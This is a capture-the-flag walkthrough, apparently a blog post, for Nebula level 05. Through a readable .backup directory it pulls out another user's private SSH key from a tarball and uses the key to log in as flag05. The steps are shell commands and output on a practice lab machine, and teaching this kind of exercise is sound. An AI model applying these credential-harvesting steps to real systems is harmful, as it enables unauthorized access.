---
layout: default
title: "Nebula05"
tags: Nebula
description: "Recovering ssh keys to capture the flag"
---


## Level 05

> Check the flag05 home directory. You are looking for weak directory permissions. To do this level, log in as the `level05` account with the password `level05`. Files for this level can be found in `/home/flag05`.

## Source code

There is no source code available for this level.

## Getting the flag

By checking the `flag05` directory we can find unprotected `.backup` folder:

```
level05@nebula:/home/flag05$ ls -lah
total 9.0K
drwxr-x--- 1 flag05 level05   80 2021-06-16 00:17 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw------- 1 flag05 flag05    13 2021-06-16 00:17 .bash_history
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
drwx------ 2 flag05 flag05    60 2021-06-15 23:06 .cache
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

Let's check and extract those backups:

```
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ mkdir /tmp/flag05
level05@nebula:/home/flag05/.backup$ tar xvzf backup-19072011.tgz -C /tmp/flag05
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/home/flag05/.backup$ cd /tmp/flag05
```

Alright, we got some ssh keys! 

Let's try them out:

```
level05@nebula:/tmp/flag05$ cd .ssh
level05@nebula:/tmp/flag05/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
level05@nebula:/tmp/flag05/.ssh$ chmod 600 id_rsa
level05@nebula:/tmp/flag05/.ssh$ ssh -i id_rsa flag05@localhost
  
      _   __     __          __     
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ / 
  /_/ |_/\___/_.___/\__,_/_/\__,_/  
                                    
    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

And we got the flag. Pay attention that `chmod 600 id_rsa` and `ssh` with `-i` flag are required to use this private key. 
